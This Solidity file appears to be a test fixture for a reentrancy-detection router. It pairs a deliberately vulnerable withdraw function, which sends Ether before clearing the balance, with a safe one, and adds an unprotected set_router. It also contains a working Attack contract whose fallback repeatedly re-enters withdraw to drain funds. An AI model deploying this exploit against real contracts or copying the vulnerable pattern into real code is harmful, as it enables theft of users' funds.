import {IProtectProject} from "../interfaces.sol";

contract EtherStore is IProtectProject {
    mapping(address => uint256) public balances;
    address router;

    constructor() payable {}

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 param) external {
        if (param >= 0 && param < 100) {
            withdraw();
        } else if (param >= 100 && param < 200) {
            withdraw2();
        }
    }

    // 重入
    function withdraw() internal {
        bytes memory data = abi.encodeWithSignature(
            "executeWithDetect(bytes)",
            msg.data
        );
        bytes memory CALLDATA = abi.encodeWithSignature("CallOn(bytes)", data);
        (bool success, ) = router.call(CALLDATA);
        if (!success) {
            revert();
        }
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // 正常
    function withdraw2() internal {
        bytes memory data = abi.encodeWithSignature(
            "executeWithDetect(bytes)",
            msg.data
        );
        bytes memory CALLDATA = abi.encodeWithSignature("CallOn(bytes)", data);
        (bool success, ) = router.call(CALLDATA);
        if (!success) {
            revert();
        }
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function set_router(address _router) external virtual {
        router = _router;
    }
}

// 模拟攻击者发送交易
contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 0.0001 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw(1);
        }
    }

    function attack(uint256 i) external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw(i);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// 模拟正常交易
contract Normal_tx {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 0.0001 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    receive() external payable {}

    function sendTx(uint256 i) external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw(i);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
